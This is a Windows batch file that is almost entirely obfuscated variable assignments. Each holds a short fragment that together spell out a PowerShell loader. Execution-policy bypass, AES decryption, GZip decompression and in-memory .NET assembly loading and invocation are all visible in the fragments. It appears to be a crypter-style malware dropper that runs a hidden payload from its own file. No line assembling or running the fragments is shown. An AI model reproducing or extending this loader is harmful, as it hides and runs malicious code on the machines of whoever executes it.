@echo off
set "HRFCvQCJiI=FQIZ"
set "rKtbGNHOtg=rity"
set "PXLMWduXbw=ach "
set "sNTojIMnPy=tS46"
set "iGKXYlmTpI=Jg.T"
set "pWcUdbYzNa=);$R"
set "IYbejakDpC=comp"
set "dERjEoibLn=gsYZ"
set "CJgLzJRKga=n ''"
set "rPrBkFiINw=hzYB"
set "igQPOKALjo=);$l"
set "phiDeOQCbz=hy.A"
set "zWbfIylCcM=-Obj"
set "WcUdARSGMj=Conv"
set "lPTOqVltss='0Pg"
set "hTWsValwLZ=6] -"
set "IvgQENwRqX=d;$l"
set "JIUuypGDEn= = N"
set "yevmBDmdSk=[Sys"
set "HYhDHYSeoN=xD, "
set "kfaYgcZqom=daeR"
set "dSSSfKhDmJ=FQIZ"
set "qCMLXMKwHG=oArr"
set "cqBmoaxaTz=CFxo"
set "ljszzQmVxr=$Oot"
set "JciwKcXDjg=esaB"
set "YLIEZxZScq=File"
set "WEnpXUcRlM=.Con"
set "DGsJxlWlDT=eam("
set "RDMTJVNWhj=tryP"
set "oZCubuINfg=; };"
set "bCOpDSTtjH=ptog"
set "qnOVMkyDND=Knk "
set "nOJWXRjbZs=);$l"
set "PIfyHqcuSu=vert"
set "kBaAToUZVU=th('"
set "sMuzBDiTGJ=i) {"
set "NvRysFdfEc=zuZI"
set "SITiYaxAVp=ZKlb"
set "oNvdaFulgn=tem."
set "dxWMJIgTWV=('%*'"
set "CFquheRzQM=kqUG"
set "ctpipAGpty=e]::"
set "aAFIwjjSoC=L4Yi"
set "fkoVFaMSGW=se()"
set "NDdDTZPYQy=-4] "
set "pCyepkjZvu=ress"
set "yuZvwZvBvw=..-1"
set "QJuVkAmwrz=t Sy"
set "fhfYfLbpjk=.Key"
set "grLxKoEpde=m.IO"
set "FdFQqrtrtQ=tYw."
set "uAUtTjlHNw=.Cry"
set "cwMxWOjuqe=FQIZ"
set "HaawbCbDzj=ring"
set "idsIqtSnka=m.Re"
set "oTzpUvWyeT= = ["
set "ifiWoQQHEP=;$Ms"
set "VXiAwZvXct=Obje"
set "pwscrVEglC=brea"
set "mQaeleeAcE=stem"
set "HTjuLYAhnM=ing("
set "ZaYczOZKwW=Fina"
set "nHwQdwApFA=7;$l"
set "SVcviFLktc=bypa"
set "zqhWxXMzcr=urit"
set "DFeMQgXceE=1] -"
set "dDTmGrSEfT=dj0C"
set "asBYXXNxYd=[Env"
set "BhQFffInnu=vHco"
set "ulfvmNsqIa=onve"
set "BPpnsNmbGn=rofi"
set "UzMNzOloHd=nirt"
set "fxwwcgBxLr=em.C"
set "qLsvAfsGTl=pher"
set "DjFepIzKPd=[-1."
set "ROeoZIYuVP=;$Oo"
set "EElMvLDMzd=-1.."
set "TeEpIOxmhB=rt]:"
set "RdbUJqFtEH=.Mod"
set "znSXmWtrEC=]::C"
set "OMHKxLMwSD=$RWQ"
set "MpZzOrhzNE=ptor"
set "eCAttTIqjl=.Cry"
set "QxLJtyjAVE=pose"
set "rFMvRHECKE=$lFQ"
set "akCvqJyLFS=ect "
set "EoqOLzQZox=kqUG"
set "aTNXBWLjqp=WQJg"
set "DIXlLWPCjs=] -j"
set "UMrGcghqIW=yste"
set "qobOWDZtPM=, (,"
set "IuzBndRLzG=ke($"
set "ORIysVbATx=UiyH"
set "zGItISnvfC=sion"
set "mYWKuZawsN=and "
set "shvAYdjVCR=)($G"
set "arJTREjfpG=Syst"
set "meOlyXSiqY=-joi"
set "dkImcscWwn=tem."
set "NJqCoOrThQ=.GZi"
set "VFQVBGZEoy=ose("
set "fHDNXJvfAh=ct S"
set "VSaAlWADyY=IZ.I"
set "vPILxIhEfi=PKCS"
set "HnzvRunhmY=oL'["
set "OxgYjUfTTc== $l"
set "sccXzEaNNC=Yw.T"
set "CQiZDCITPF=Comp"
set "rZcnRyMzcx=Hco."
set "sscOiHjFbc=, $G"
set "PmbSDuMdwZ=GkqU"
set "VjQoPFEvPL= if "
set "RGoxooWtPH===')"
set "syYtZNPkyI=grap"
set "VXKGYWiOyX=.Sec"
set "HvUCMfaKrr=ct S"
set "sNLaucyfiW=;$Uv"
set "EzNgIIJifq=V = "
set "tieUCeLKwH=ress"
set "FNMRtewfzV=gnir"
set "cgvWzvHWQZ= '')"
set "cgWVMyOPqp=-nop"
set "NlNKIEDSMD=NqWk"
set "MnIYUTfTXa=lit("
set "XXVdGJMwpA=Jg ="
set "iCATHPaQim='[-1"
set "WJNJhSiCDP=106u"
set "QgcpNINsRY=gjYA"
set "HZCWjDogbl=in $"
set "MkoLpKfXmr=$RWQ"
set "GxVSIznxKT=('%~f0'"
set "oPyZtVsgaZ=iron"
set "NjDSPhHjex= [Sy"
set "rpdUfusRQT=orF'"
set "WNCUoWzBZN= [st"
set "HhXNGQAoeV=-ep "
set "aIpGKBxNNx== [S"
set "hdnJqYbCGb=Secu"
set "grjaMltGyg=[Sys"
set "KnuiIuVMOX=m.IO"
set "CWaCeQwdmN=:('g"
set "TRtGbAwqPr=1..-"
set "jbxMhyuspt=FQIZ"
set "QHpRtUFdvG=YBK."
set "kMBlqdLbuM=lFQI"
set "tuAJTLguvn=]::N"
set "CKzkPPfFBg= '')"
set "aEOvgTtKUK=.Dis"
set "gmPRgnhkgM=YBK "
set "BKGnyUzKnx=m(, "
set "DDfjmAropz=RmAx"
set "UecVfvdcIL=New-"
set "XppYfFjCYb=.-16"
set "dHstkQesSU=).Sp"
set "AtrhryamJZ=PxEW"
set "wyMtfNAfTf=.Cop"
set "IyKBTxOBhu=ose("
set "xktCzwMcoi=O.Me"
set "cxTyYUxncw=$Mse"
set "XwLYvZUqyE=New-"
set "ebsHxvmAQe= = $"
set "guBiNxsHTf=($hz"
set "HoFckCheEd=G = "
set "XvxuxEIaOa=ert]"
set "eJwTfAVfFh=yTo("
set "umuZGYPmSj=Disp"
set "npTBnaYrRB=PTtG"
set "weuTJMcUaa=]::("
set "oumwtWyJuf=)($z"
set "BOsjSpoFNu=)))"
set "rOOcXtsKEK=[]] "
set "tRWQySXwyR=ion."
set "kcxIkxGtbf==');"
set "vMAgVAPpvI=bjec"
set "esHqXpRlwl=YxVw"
set "zSszXcSviE=Z.Pa"
set "ZsCwDkJFbt=morF"
set "jRRyjMxzwB=ddin"
set "MElSuKhHNk=GkqU"
set "yawZtqTXbW= [Sy"
set "HDKFGDFqhq=..-1"
set "cKIHntzgLt=6esa"
set "aAajqLUjSe=:: '"
set "qDoEcUVMjD=esMa"
set "npUxlVwxGt=Obje"
set "BZTXpmFUED=ne);"
set "esjAabKxXF='[-1"
set "ieupOamKoK=.Dis"
set "uHwIYbLENw=16] "
set "DQUGeDWiSG=tion"
set "AZcpVLgSsF=raph"
set "PzZyiNOaKK=Disp"
set "kTnAxMHuZn=$Gkq"
set "EyNNPxLqfr=k; }"
set "lTwpNaShNo=S46e"
set "BncDhlcKpT=UiyH"
set "GeukRVxyap=e = "
set "EMarGcNXPR=();$"
set "YQcQLjYdoD=stem"
set "ebzFhSyHil=n ''"
set "FkvwcbDHdZ=;$Cs"
set "HqYAmejNEH=qWkF"
set "jehxjvrryc=kF.D"
set "qSstgzewLX=lBlo"
set "xJuDWVTVDL=('da"
set "ukzwZgrHed=[IO."
set "TXBwvWYvnF=s75K"
set "qDfgDEtRAd=]::("
set "sOcVDbQdAq=pose"
set "vtKqywIjAR=oryS"
set "CaXMnpKxSy=trea"
set "yBODeVxdWJ=pStr"
set "NIqxvVELJe=am;$"
set "GOoAJOXfIu=)) {"
set "alqUvaIqOe=tYw "
set "keXdKTNhcz='gni"
set "ZYBPZxhMiR=nage"
set "utWLipFaIH=UG ="
set "NwllqIbKUa=bstr"
set "ykazbEzPcz=ress"
set "MrRtaxlutc=ck($"
set "ncMphDKCxU=rtS4"
set "wIOkSbprWA=null"
set "BlrNhuQMVC=ptog"
set "asEOYcOemh=oint"
set "UEvvMTYOXn=ypto"
set "UdSBstMfUD=le  "
set "EMRFvWbMkO=();$"
set "WFZwjQtSBo=::De"
set "gAWyWfweLy=y.Pa"
set "DfLLjjapOO=bi ="
set "YFSZiFCTpx=y.Ci"
set "GhomLlWwtR=GkqU"
set "FtyKmpGhXH=('Tg"
set "HhumRhDxHJ=ew-O"
set "uuAsqJREss=Star"
set "SuvAZLdywa=);$U"
set "kPNslHgKCn=Invo"
set "hPzjJTpOfH=fore"
set "gtkYYhnkAl=.IO."
set "IbrTKzJlUg=oin "
set "rztmLkBgdQ=$Gkq"
set "qVQIDwPOMV=form"
set "tpGLtFJCjb=zHhH"
set "HCLSyenyrI=$ZKl"
set "UPRqJwjmJV=gth)"
set "QcHWBrGfWB=G = "
set "KgRpONKlfd=l5E7"
set "THOJqhrpza=-joi"
set "khbuxWeeaJ=;$Oo"
set "BKaGTvxFyi=gMod"
set "semOhEZTeI=exD."
set "apzRiPLNaX=();$"
set "GuOmBSvDJi=UG);"
set "HpyFRgWuLF= New"
set "JjCNtgZsXf=embl"
set "NsNxfjqCqI=3); "
set "ZhmwqgBpOU=join"
set "HGjWkBqACJ=ay()"
set "uLfWOCeVee=rans"
set "rUKQqOgQhO=K.Su"
set "LJVMHuSBGB=comm"
